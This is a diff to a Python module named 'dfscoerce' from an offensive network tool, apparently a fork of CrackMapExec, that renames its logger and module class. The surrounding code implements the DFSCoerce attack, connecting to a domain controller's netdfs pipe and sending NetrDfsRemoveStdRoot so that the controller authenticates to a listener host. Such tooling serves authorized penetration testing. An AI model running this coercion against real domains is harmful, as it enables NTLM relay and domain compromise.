@@ -7,10 +7,10 @@ from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import ULONG, WSTR, DWORD
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.uuid import uuidtup_to_bin
-from cme.logger import cme_logger
+from bma.logger import bma_logger
 
 
-class CMEModule:
+class bmaModule:
     name = "dfscoerce"
     description = "Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam"
     supported_protocols = ["smb"]
@@ -123,31 +123,31 @@ class TriggerAuth:
 
         rpctransport.setRemoteHost(target)
         dce = rpctransport.get_dce_rpc()
-        cme_logger.debug("[-] Connecting to %s" % r"ncacn_np:%s[\PIPE\netdfs]" % target)
+        bma_logger.debug("[-] Connecting to %s" % r"ncacn_np:%s[\PIPE\netdfs]" % target)
         try:
             dce.connect()
         except Exception as e:
-            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
+            bma_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
         try:
             dce.bind(uuidtup_to_bin(("4FC742E0-4A10-11CF-8273-00AA004AE673", "3.0")))
         except Exception as e:
-            cme_logger.debug("Something went wrong, check error status => %s" % str(e))
+            bma_logger.debug("Something went wrong, check error status => %s" % str(e))
             return
-        cme_logger.debug("[+] Successfully bound!")
+        bma_logger.debug("[+] Successfully bound!")
         return dce
 
     def NetrDfsRemoveStdRoot(self, dce, listener):
-        cme_logger.debug("[-] Sending NetrDfsRemoveStdRoot!")
+        bma_logger.debug("[-] Sending NetrDfsRemoveStdRoot!")
         try:
             request = NetrDfsRemoveStdRoot()
             request["ServerName"] = "%s\x00" % listener
             request["RootShare"] = "test\x00"
             request["ApiFlags"] = 1
             if self.args.verbose:
-                cme_logger.debug(request.dump())
+                bma_logger.debug(request.dump())
             # logger.debug(request.dump())
             resp = dce.request(request)
 
         except Exception as e:
-            cme_logger.debug(e)
+            bma_logger.debug(e)
